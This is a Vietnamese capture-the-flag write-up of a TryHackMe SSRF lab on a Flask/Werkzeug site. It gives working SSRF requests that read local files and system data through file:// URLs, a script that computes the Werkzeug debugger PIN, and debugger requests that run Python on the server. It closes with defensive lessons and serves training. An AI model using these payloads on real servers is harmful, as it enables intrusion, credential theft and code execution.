# SSRF

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | https://tryhackme.com/room/ssrfqi |
| **Độ khó** | Medium |
| **Chủ đề** | Web, SSRF, RCE, Werkzeug |
| **Ngày** | 16/06/2026 |

---

## Mô tả

Website portfolio của một nhà thực vật học ("Jay Green") chạy Flask/Werkzeug. Challenge có 3 câu hỏi:

1. API key dùng để lấy file từ secure storage là gì?
2. Flag trong trang admin là gì?
3. Flag trong file text trong thư mục web là gì?

Chuỗi khai thác: **SSRF qua tham số `server`** → đọc source code → lấy API key → dùng `file://` SSRF đọc PDF flag → brute-force PIN Werkzeug debugger → RCE → đọc file flag.

---

## Trinh sát

### Khám phá web

Truy cập `http://[IP]/`, trang chủ là portfolio thực vật học với hai link đáng chú ý:

- **Download link**: `/download?server=secure-file-storage.com:8087&id=75482342`
- **Admin link**: `/admin` (thông báo "Admin interface only available from localhost!!!")

Xem page source — có Werkzeug debugger đang chạy với `EVALEX = true` và lộ `SECRET = "gvbQtUiOI3P10tRxUKW5"` trong JavaScript. Đây là dấu hiệu server đang dùng Flask dev server với debug mode bật.

---

## Phân tích lỗ hổng

### SSRF qua tham số `server`

Endpoint `/download` nhận tham số `server` và `id`, sau đó dùng **pycurl** để fetch URL:

```
server + '/public-docs-k057230990384293/' + str(int(id)) + '.pdf'
```

Tham số `server` **không được kiểm tra** — kẻ tấn công kiểm soát hoàn toàn scheme và hostname. Đây là lỗ hổng **SSRF (Server-Side Request Forgery)**.

### Khai thác SSRF — đọc source code

pycurl hỗ trợ scheme `file://`, cho phép đọc file local. Thủ thuật dùng `#` (fragment) để cắt bỏ phần path không mong muốn:

URL pycurl sẽ fetch: `file:///usr/src/app/app.py#/public-docs-k057230990384293/75482342.pdf`

pycurl bỏ qua fragment `#...`, chỉ đọc `file:///usr/src/app/app.py`.

```
GET /download?server=file:///usr/src/app/app.py%23&id=75482342
```

Kết quả — toàn bộ source code `app.py`:

```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"

@app.route("/download")
def download():
    file_id = request.args.get('id','')
    server = request.args.get('server','')

    if file_id!='':
        filename = str(int(file_id)) + '.pdf'

        response_buf = BytesIO()
        crl = pycurl.Curl()
        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
        crl.setopt(crl.WRITEDATA, response_buf)
        crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])  # <-- Flag 1
        crl.perform()
        ...

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8087, debug=True)  # <-- cổng nội bộ 8087!
```

**Flag 1**: `THM{Hello_Im_just_an_API_key}`

---

## Lấy Flag 2 — Admin section

### Đọc flag.pdf qua SSRF file://

Trang `/admin` trả về `flag.pdf` nếu request đến từ `127.0.0.1`. Dùng SSRF `file://` đọc thẳng PDF:

```
GET /download?server=file:///usr/src/app/private-docs/flag.pdf%23&id=75482342
```

PDF trả về với nội dung được encode bằng CID font. Giải mã từ CMap trong stream:

```
Mapping:
01=t, 02=h, 03=m, 04={, 05=c, 06=4, 07=n, 08=_, 09=i, 0A=a,
0B=z, 0C=f, 0D=l, 0E=g, 0F=p, 10=?, 11=}

Text stream: <01020304> <0506> <07> <08> <09> <08> <02> <0A>
             <0B08 0C0D 0A0E 0B08 0F0D> <0B 10 11>
→ thm{c4n_i_haz_flagz_plz?}
```

**Flag 2**: `THM{c4n_i_haz_flagz_plz?}`

---

## Lấy Flag 3 — File text trong thư mục web

### Tính PIN Werkzeug debugger

Server bật `debug=True` với `EVALEX=true` → có interactive Python console trong debugger. PIN bảo vệ console này nhưng có thể **tính toán lại** từ thông tin hệ thống.

Thu thập thông tin qua SSRF:

```bash
# Username (UID=0 → root)
GET /download?server=file:///proc/self/status%23&id=75482342

# Docker container ID (machine_id)
GET /download?server=file:///proc/self/cgroup%23&id=75482342
→ /docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca

# MAC address
GET /download?server=file:///sys/class/net/eth0/address%23&id=75482342
→ 02:42:ac:14:00:02
```

Thuật toán PIN của Werkzeug dùng MD5 hash của các giá trị:

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root',                                         # username
    'flask.app',                                    # modname
    'Flask',                                        # app class name
    '/usr/local/lib/python3.10/site-packages/flask/app.py',  # Flask path
]
private_bits = [
    str(int('0242ac140002', 16)),   # MAC → 2485378088962
    '77c09e05c4a9...049ca',         # Docker container ID
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    h.update(bit.encode('utf-8'))
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]
pin = '-'.join([num[:3], num[3:6], num[6:]])
# → 110-688-511
```

### Xác thực PIN và RCE

```python
# Bước 1: Xác thực PIN → nhận cookie auth
GET /?__debugger__=yes&cmd=pinauth&pin=110-688-511&s=gvbQtUiOI3P10tRxUKW5
# → {"auth": true, "exhausted": false}

# Bước 2: Trigger error để lấy frame ID
GET /download?server=localhost&id=admin
# → HTML chứa id="frame-140450952107952"

# Bước 3: Thực thi Python trong debugger console (với cookie auth)
GET /download?server=localhost&id=admin&__debugger__=yes
    &cmd=__import__("os").listdir("/usr/src/app")
    &frm=140450952107952&s=gvbQtUiOI3P10tRxUKW5
# → ['requirements.txt', 'Dockerfile', ..., 'flag-982374827648721338.txt']
```

Biết tên file, dùng SSRF đọc:

```
GET /download?server=file:///usr/src/app/flag-982374827648721338.txt%23&id=75482342
```

**Flag 3**: `THM{SSRF2RCE_2_1337_4_M3}`

---

## Tổng kết

| Câu hỏi | Flag |
|---------|------|
| API key của secure storage | `THM{Hello_Im_just_an_API_key}` |
| Flag trong admin section | `THM{c4n_i_haz_flagz_plz?}` |
| Flag trong file text | `THM{SSRF2RCE_2_1337_4_M3}` |

### Chuỗi tấn công

```
SSRF (file://) → Đọc app.py → Lấy API key (Flag 1)
                           → Phát hiện port 8087 nội bộ
                           → Đọc flag.pdf (Flag 2)
                           → Thu thập thông tin hệ thống
                           → Tính PIN Werkzeug
                           → RCE qua debugger console
                           → Liệt kê thư mục web
                           → Đọc file flag (Flag 3)
```

### Bài học

1. **`file://` qua pycurl/libcurl**: Nếu SSRF dùng libcurl, `file://` scheme thường được hỗ trợ mặc định. Fragment `#` cho phép bypass phần path cố định được nối thêm.
2. **Werkzeug debug mode trong production**: `debug=True` lộ interactive console. PIN có thể tính lại nếu biết username, Flask path, MAC, và machine ID (thường là Docker container ID).
3. **API key trong header**: Hardcode credential trong code → lộ khi SSRF đọc được source.
4. **Nguyên tắc defense-in-depth**: Mỗi lớp bảo vệ đều thất bại riêng lẻ → kẻ tấn công leo thang từ SSRF thành RCE.
